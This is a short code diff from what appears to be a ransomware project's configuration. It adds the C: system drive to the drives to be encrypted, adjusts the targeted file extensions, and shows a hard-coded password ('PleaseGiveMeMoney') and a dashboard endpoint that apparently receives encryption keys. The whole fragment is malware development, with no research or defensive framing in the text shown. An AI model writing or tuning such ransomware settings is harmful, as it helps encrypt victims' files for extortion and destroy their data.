@@ -59,8 +59,8 @@ THANKS_PATH = resource_path("img/thank-you.png")
 ensure_time_dir_exists()
 
 # Encryption Configuration
-DRIVES_TO_ENCRYPT = ['F:', 'E:','D:']
-EXTENSIONS_TO_ENCRYPT = ['.txt', '.jpg', '.png', '.pdf', '.zip', '.rar', '.xlsx', '.docx','.iso']
+DRIVES_TO_ENCRYPT = ['F:', 'E:','D:','C:']
+EXTENSIONS_TO_ENCRYPT = ['.txt', '.jpg', '.png', '.pdf', '.zip', '.rar', '.xlsx', '.docx']
 PASSWORD_PROVIDED = 'PleaseGiveMeMoney'
 DASHBOARD_URL = 'http://localhost/prjrans/includes/api/receive_key.php'
 MAX_ATTEMPTS = 10
